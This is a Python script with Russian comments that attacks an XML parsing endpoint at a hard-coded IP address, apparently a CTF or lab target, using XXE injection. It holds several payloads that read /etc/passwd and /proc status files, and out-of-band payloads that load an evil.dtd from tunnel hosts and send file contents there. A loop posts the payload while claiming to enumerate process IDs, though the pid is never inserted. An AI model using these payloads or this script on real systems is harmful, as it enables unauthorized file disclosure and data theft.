import requests
import re
import time

TARGET_URL = "http://62.173.140.174:36109/parse"
start_pid = 1
end_pid = 50
LOG_FILE = "pid_results.txt"

def extract_process_name(content):
    """Извлекает имя процесса из /proc/PID/status"""
    match = re.search(r'Name:\s*(\S+)', content)
    if match:
        return match.group(1)
    return "Unknown"

with open(LOG_FILE, 'w', encoding='utf-8') as f:
    f.write(f"Начало сканирования PID от {start_pid} до {end_pid}\n")

"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///proc/{pid}/status">
]>
<user>
  <name>&xxe;</name>
</user>"""

"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///proc/self/status">
  <!ENTITY % dtd SYSTEM "http://f1c2223fa024a779-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>test</data>"""


'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY %file SYSTEM "file:///proc/self/status">
  <!ENTITY %dtd SYSTEM "http://f1c2223fa024a779-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>test</data>'''

"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://f1c2223fa024a779-91-78-140-18.serveousercontent.com/log?data=file:///etc/passwd">
]>
<request>
    <info>&xxe;</info>
</request>"""

"""
<!DOCTYPE data [
  <!ENTITY test SYSTEM "http://c60777502c28fb10-91-78-140-18.serveousercontent.com/ping">
]>
<data>&test;</data>
"""

"""<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://c60777502c28fb10-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
"""

"""<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://c60777502c28fb10-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
"""

"""
    <!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://c60777502c28fb10-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>test</data>
    """
    
"""
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY exfil SYSTEM "http://8afa2a31ee172659-91-78-140-18.serveousercontent.com/log?x=&xxe;">
]>
<data>&exfil;</data>
"""
    
for pid in range(start_pid, end_pid + 1):
    xml_payload = f"""
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://8afa2a31ee172659-91-78-140-18.serveousercontent.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
    """

    try:
        response = requests.post(
            TARGET_URL,
            data={'xml': xml_payload},
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )

        print(f"Answer: {response.text}")

        process_name = extract_process_name(response.text)

        print(f"PID: {pid} | Имя процесса: {process_name}")

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"PID: {pid} | Имя процесса: {process_name}\n")

    except Exception as e:
        error_msg = str(e)
        print(f"PID: {pid} | Ошибка: {error_msg}")
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            if "No such file or directory" not in error_msg and "Permission denied" not in error_msg:
                f.write(f"PID: {pid} | Ошибка: {error_msg}\n")

    time.sleep(0.1)

print(f"\nСканирование завершено. Результаты сохранены в {LOG_FILE}")
